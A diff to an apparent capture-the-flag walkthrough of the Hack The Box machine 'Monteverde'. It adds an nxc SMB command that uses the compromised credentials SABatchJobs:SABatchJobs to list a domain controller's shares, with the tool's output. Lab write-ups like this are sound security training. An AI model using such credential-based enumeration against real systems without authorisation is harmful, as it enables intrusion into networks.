@@ -147,4 +147,23 @@ SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJo
 ```
 I have compromised the user `SABatchJobs`
 
-# Access as `SAB`
+# Access as `SABatchJobs`
+
+## Shares
+
+```python
+nxc smb monteverde.megabank.local -u SABatchJobs -p 'SABatchJobs' --shares       
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+SMB         10.129.35.54    445    MONTEVERDE       [*] Enumerated shares
+SMB         10.129.35.54    445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.129.35.54    445    MONTEVERDE       -----           -----------     ------
+SMB         10.129.35.54    445    MONTEVERDE       ADMIN$                          Remote Admin
+SMB         10.129.35.54    445    MONTEVERDE       azure_uploads   READ            
+SMB         10.129.35.54    445    MONTEVERDE       C$                              Default share
+SMB         10.129.35.54    445    MONTEVERDE       E$                              Default share
+SMB         10.129.35.54    445    MONTEVERDE       IPC$            READ            Remote IPC
+SMB         10.129.35.54    445    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.129.35.54    445    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.129.35.54    445    MONTEVERDE       users$          READ
+```
